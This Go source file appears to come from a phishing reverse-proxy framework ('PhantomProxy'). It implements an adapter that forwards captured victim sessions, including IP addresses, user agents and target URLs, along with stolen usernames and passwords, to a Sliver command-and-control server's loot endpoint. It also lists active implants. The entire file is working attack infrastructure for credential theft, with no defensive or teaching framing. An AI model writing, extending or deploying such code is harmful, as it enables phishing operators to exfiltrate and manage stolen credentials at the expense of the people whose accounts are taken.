package c2

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"go.uber.org/zap"
)

// SliverAdapter integrates with Sliver C2 via gRPC/REST
type SliverAdapter struct {
	config     *SliverConfig
	httpClient *http.Client
	logger     *zap.Logger
}

// SliverConfig configuration
type SliverConfig struct {
	Enabled       bool   `yaml:"enabled" mapstructure:"enabled"`
	ServerURL     string `yaml:"server_url" mapstructure:"server_url"`
	OperatorToken string `yaml:"operator_token" mapstructure:"operator_token"`
	CallbackHost  string `yaml:"callback_host" mapstructure:"callback_host"`
}

// NewSliverAdapter creates Sliver adapter
func NewSliverAdapter(cfg *SliverConfig, logger *zap.Logger) *SliverAdapter {
	return &SliverAdapter{
		config: cfg,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
		logger: logger,
	}
}

// Name returns adapter name
func (a *SliverAdapter) Name() string { return "sliver" }

// IsAvailable checks Sliver server connectivity
func (a *SliverAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.ServerURL == "" {
		return false
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/v1/version", nil)
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		a.logger.Warn("Sliver connectivity check failed", zap.Error(err))
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

// SendSession sends captured session to Sliver
func (a *SliverAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending session to Sliver",
		zap.String("session_id", data.SessionID),
		zap.String("victim_ip", data.VictimIP))

	// Sliver REST API: POST /api/v1/loot
	payload := map[string]interface{}{
		"type":        "credential",
		"protocol":    "https",
		"username":    data.VictimIP,
		"description": fmt.Sprintf("PhantomProxy Session: %s", data.PhishletID),
		"metadata": map[string]string{
			"session_id":  data.SessionID,
			"phishlet":    data.PhishletID,
			"user_agent":  data.UserAgent,
			"target_url":  data.TargetURL,
			"callback":    a.config.CallbackHost,
		},
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/loot", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("sliver API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("sliver API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Session sent to Sliver successfully")
	return nil
}

// SendCredentials sends credentials to Sliver loot
func (a *SliverAdapter) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending credentials to Sliver",
		zap.String("username", creds.Username))

	// Sliver REST API: POST /api/v1/loot
	payload := map[string]interface{}{
		"type":        "credential",
		"protocol":    "autofill",
		"username":    creds.Username,
		"password":    creds.Password,
		"description": "PhantomProxy Captured Credentials",
		"metadata":    metadata,
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/loot", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("sliver API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("sliver API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Credentials sent to Sliver successfully")
	return nil
}

// HealthCheck verifies Sliver connection
func (a *SliverAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("sliver server not available")
	}
	return nil
}

// GetImplants lists active implants
func (a *SliverAdapter) GetImplants(ctx context.Context) ([]map[string]interface{}, error) {
	if !a.config.Enabled {
		return nil, fmt.Errorf("sliver not enabled")
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/v1/implants", nil)
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var implants []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&implants); err != nil {
		return nil, err
	}

	return implants, nil
}
